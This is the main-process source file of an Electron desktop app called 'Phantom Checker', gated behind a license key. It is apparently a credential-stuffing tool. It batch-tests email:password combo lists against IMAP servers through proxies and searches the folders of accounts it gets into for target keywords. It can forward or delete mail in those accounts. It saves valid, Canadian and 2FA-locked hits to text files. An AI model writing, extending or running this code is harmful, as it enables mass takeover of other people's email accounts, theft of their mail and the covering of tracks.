/**
 * Phantom Checker — Electron Main Process
 * Manages the browser window, IMAP HTTP server, and license gate.
 */

import { app, BrowserWindow, ipcMain, shell } from 'electron';
import { createServer } from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import {
  verifyImapCredentials,
  fetchAllRealFolders,
  deleteRealImapMessage,
  forwardRealEmail,
  testProxyConnection
} from '../src/server/imapService.js';
import {
  getMachineId,
  validateKey,
  saveLicense,
  loadLicense,
  checkLicenseOnStartup
} from './license.js';

// ─── Single Instance Lock ─────────────────────────────────────────────────────
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  // Another instance is already running — exit immediately
  app.quit();
  process.exit(0);
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const isDev = process.env.NODE_ENV === 'development';
const DEV_URL = 'http://localhost:5173';

let mainWindow = null;
let apiServer = null;
let currentPort = 7331;

app.on('second-instance', () => {
  if (mainWindow) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
});

// ─── JSON body parser ─────────────────────────────────────────────────────────
function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try { resolve(body ? JSON.parse(body) : {}); }
      catch (err) { reject(err); }
    });
    req.on('error', reject);
  });
}

// ─── MIME Types for Static Files ──────────────────────────────────────────────
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.mjs': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

// ─── IMAP API & Static File Server ────────────────────────────────────────────
function startApiServer() {
  return new Promise((resolve) => {
    function tryListen(port) {
      const server = createServer(async (req, res) => {
        const sendJson = (status, data) => {
          res.statusCode = status;
          res.setHeader('Content-Type', 'application/json');
          res.setHeader('Access-Control-Allow-Origin', '*');
          res.end(JSON.stringify(data));
        };

        // CORS preflight
        if (req.method === 'OPTIONS') {
          res.setHeader('Access-Control-Allow-Origin', '*');
          res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
          res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
          res.statusCode = 204;
          res.end();
          return;
        }

        // ── Static Frontend Serving (non-API routes) ──
        if (!req.url.startsWith('/api/')) {
          try {
            const distDir = path.join(app.getAppPath(), 'dist');
            const urlPath = req.url.split('?')[0];
            let targetPath = path.join(distDir, urlPath === '/' ? 'index.html' : urlPath);

            if (!fs.existsSync(targetPath) || fs.statSync(targetPath).isDirectory()) {
              targetPath = path.join(distDir, 'index.html');
            }

            if (fs.existsSync(targetPath)) {
              const ext = path.extname(targetPath).toLowerCase();
              res.statusCode = 200;
              res.setHeader('Content-Type', MIME_TYPES[ext] || 'application/octet-stream');
              fs.createReadStream(targetPath).pipe(res);
              return;
            }
          } catch (staticErr) {
            console.error('[Static Server Error]:', staticErr);
          }

          sendJson(404, { error: 'Not found' });
          return;
        }

        if (req.method !== 'POST') {
          sendJson(405, { error: 'Method not allowed' });
          return;
        }

        try {
          const body = await parseJsonBody(req);

          // ── /api/check-imap ──
          if (req.url === '/api/check-imap') {
            const { host, port: imapPort, email, password, timeout, proxy } = body;
            if (!host || !email || !password) { sendJson(400, { error: 'Missing host, email, or password' }); return; }
            const result = await verifyImapCredentials({ host, port: Number(imapPort) || 993, user: email, pass: password, timeout: Number(timeout) || 8000, proxy: proxy || null });
            sendJson(200, result);
            return;
          }

          // ── /api/check-imap-batch ──
          if (req.url === '/api/check-imap-batch') {
            const { items } = body;
            if (!Array.isArray(items) || items.length === 0) { sendJson(400, { error: 'Missing or empty items array' }); return; }
            const results = await Promise.all(items.map(async item => {
              const checkResult = await verifyImapCredentials({ host: item.host, port: Number(item.port) || 993, user: item.email, pass: item.password, timeout: Number(item.timeout) || 8000, proxy: item.proxy || null });
              return { id: item.id, email: item.email, ...checkResult };
            }));
            sendJson(200, { success: true, results });
            return;
          }

          // ── /api/test-proxy ──
          if (req.url === '/api/test-proxy') {
            const { proxy, timeout } = body;
            if (!proxy || !proxy.host || !proxy.port) { sendJson(400, { error: 'Missing proxy parameters' }); return; }
            const result = await testProxyConnection(proxy, Number(timeout) || 5000);
            sendJson(200, result);
            return;
          }

          // ── /api/fetch-all-folders ──
          if (req.url === '/api/fetch-all-folders' || req.url === '/api/fetch-mails') {
            const { host, port: fPort, email, password, maxPerFolder, timeout, keywords, proxy } = body;
            if (!host || !email || !password) { sendJson(400, { error: 'Missing host, email, or password' }); return; }
            const result = await fetchAllRealFolders({ host, port: Number(fPort) || 993, user: email, pass: password, maxPerFolder: maxPerFolder !== undefined ? Number(maxPerFolder) : 100, timeout: Number(timeout) || 45000, keywords: Array.isArray(keywords) ? keywords : [], proxy: proxy || null });
            sendJson(200, result);
            return;
          }

          // ── /api/delete-mail ──
          if (req.url === '/api/delete-mail') {
            const { host, port: dPort, email, password, folder, serverPath, uid, permanently, proxy } = body;
            const result = await deleteRealImapMessage({ host, port: Number(dPort) || 993, user: email, pass: password, folder, serverPath, uid, permanently, proxy: proxy || null });
            sendJson(200, result);
            return;
          }

          // ── /api/forward-mail ──
          if (req.url === '/api/forward-mail') {
            const { host, port: fPort, smtpHost, smtpPort, email, password, to, subject, note, origBodyText, origBodyHtml, proxy } = body;
            if (!to) { sendJson(400, { error: 'Missing destination email (to)' }); return; }
            const result = await forwardRealEmail({ host, port: Number(fPort) || 993, smtpHost, smtpPort: Number(smtpPort) || 587, user: email, pass: password, to, subject: subject || 'Fwd: Email Message', note, origBodyText: origBodyText || '', origBodyHtml: origBodyHtml || '', proxy: proxy || null });
            sendJson(200, result);
            return;
          }

          // ── /api/machine-id ──
          if (req.url === '/api/machine-id') {
            sendJson(200, { machineId: getMachineId() });
            return;
          }

          sendJson(404, { error: 'Unknown API endpoint' });
        } catch (err) {
          sendJson(500, { success: false, error: err.message });
        }
      });

      // Handle listen errors gracefully (prevent crash on EADDRINUSE)
      server.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
          console.warn(`[Phantom API] Port ${port} is in use. Trying port ${port + 1}...`);
          try { server.close(); } catch {}
          tryListen(port + 1);
        } else {
          console.error('[Phantom API] Server error:', err);
        }
      });

      server.listen(port, '127.0.0.1', () => {
        currentPort = port;
        apiServer = server;
        console.log(`[Phantom API] Server running on http://127.0.0.1:${port}`);
        resolve(port);
      });
    }

    tryListen(7331);
  });
}

// ─── Window Management ────────────────────────────────────────────────────────
function createMainWindow() {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 1100,
    minHeight: 700,
    frame: false,
    titleBarStyle: 'hidden',
    backgroundColor: '#05070d',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      webSecurity: false
    },
    title: 'Phantom Checker',
    icon: path.join(__dirname, '../public/icon.ico')
  });

  if (isDev) {
    mainWindow.loadURL(DEV_URL);
    mainWindow.webContents.openDevTools({ mode: 'detach' });
  } else {
    mainWindow.loadURL(`http://127.0.0.1:${currentPort}`);
  }

  mainWindow.on('closed', () => { mainWindow = null; });
}

// ─── IPC Handlers ─────────────────────────────────────────────────────────────
ipcMain.handle('get-machine-id', () => getMachineId());

ipcMain.handle('validate-license', async (_, key) => {
  const result = validateKey(key);
  if (result.valid) {
    saveLicense(key);
  }
  return result;
});

ipcMain.handle('get-license-status', () => {
  return checkLicenseOnStartup();
});

ipcMain.handle('window-minimize', () => { mainWindow?.minimize(); });
ipcMain.handle('window-maximize', () => {
  if (mainWindow?.isMaximized()) mainWindow.unmaximize();
  else mainWindow?.maximize();
});
ipcMain.handle('window-close', () => { mainWindow?.close(); });

/**
 * export-hits-folder
 * Payload: { combos, keywords, mails, stats }
 * Creates Hits/<timestamp>/ with sorted keyword files on Desktop.
 */
ipcMain.handle('export-hits-folder', async (_, { combos, keywords, mails, stats }) => {
  try {
    const now = new Date();
    const stamp = now.toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const desktopPath = app.getPath('desktop');
    const hitsRoot = path.join(desktopPath, 'Phantom Hits');
    const runDir = path.join(hitsRoot, stamp);
    const kwDir = path.join(runDir, 'keywords');
    fs.mkdirSync(kwDir, { recursive: true });

    const validCombos = (combos || []).filter(c => c.status === 'valid');
    const canadianCombos = validCombos.filter(c => c.isCanadian);
    const tfaCombos = (combos || []).filter(c => c.status === '2fa');

    // valid_all.txt
    fs.writeFileSync(
      path.join(runDir, 'valid_all.txt'),
      validCombos.map(c => `${c.email}:${c.password}`).join('\n'),
      'utf8'
    );

    // valid_canadian.txt
    fs.writeFileSync(
      path.join(runDir, 'valid_canadian.txt'),
      canadianCombos.map(c => `${c.email}:${c.password}`).join('\n'),
      'utf8'
    );

    // 2fa_locked.txt
    fs.writeFileSync(
      path.join(runDir, '2fa_locked.txt'),
      tfaCombos.map(c => `${c.email}:${c.password}`).join('\n'),
      'utf8'
    );

    // summary.txt
    const summaryLines = [
      `Phantom Checker — Run Summary`,
      `Generated: ${now.toUTCString()}`,
      `─────────────────────────────────────`,
      `Total Loaded  : ${stats?.totalLoaded ?? 0}`,
      `Checked       : ${stats?.checked ?? 0}`,
      `Valid Hits    : ${stats?.validHits ?? 0}`,
      `Canadian Hits : ${stats?.canadianHits ?? 0}`,
      `2FA Locked    : ${stats?.securityLock ?? 0}`,
      `Invalid       : ${stats?.invalid ?? 0}`,
      `Target Hits   : ${stats?.targetHitsCount ?? 0}`,
      `─────────────────────────────────────`,
    ];
    fs.writeFileSync(path.join(runDir, 'summary.txt'), summaryLines.join('\n'), 'utf8');

    // keywords/<keyword>.txt — combos matching each keyword
    if (Array.isArray(keywords) && Array.isArray(mails)) {
      const kwMap = {};
      mails.forEach(mail => {
        if (!mail.matchedTargets || mail.matchedTargets.length === 0) return;
        const combo = validCombos.find(c => c.email.toLowerCase() === mail.email?.toLowerCase());
        if (!combo) return;
        mail.matchedTargets.forEach(kw => {
          const key = kw.toLowerCase().replace(/[^a-z0-9_-]/g, '_');
          if (!kwMap[key]) kwMap[key] = new Set();
          kwMap[key].add(`${combo.email}:${combo.password}`);
        });
      });

      // Also use matchedKeywords from combo list itself
      validCombos.forEach(c => {
        if (!c.matchedKeywords || c.matchedKeywords.length === 0) return;
        c.matchedKeywords.forEach(kw => {
          const key = kw.toLowerCase().replace(/[^a-z0-9_-]/g, '_');
          if (!kwMap[key]) kwMap[key] = new Set();
          kwMap[key].add(`${c.email}:${c.password}`);
        });
      });

      for (const [kwKey, entries] of Object.entries(kwMap)) {
        if (entries.size === 0) continue;
        fs.writeFileSync(
          path.join(kwDir, `${kwKey}.txt`),
          Array.from(entries).join('\n'),
          'utf8'
        );
      }
    }

    // Open the folder in Explorer
    shell.openPath(runDir);
    return { success: true, path: runDir };
  } catch (err) {
    return { success: false, error: err.message };
  }
});

// ─── App Lifecycle ────────────────────────────────────────────────────────────
app.whenReady().then(async () => {
  await startApiServer();
  createMainWindow();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createMainWindow();
    }
  });
});

app.on('before-quit', () => {
  if (apiServer) {
    try { apiServer.close(); } catch {}
    apiServer = null;
  }
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
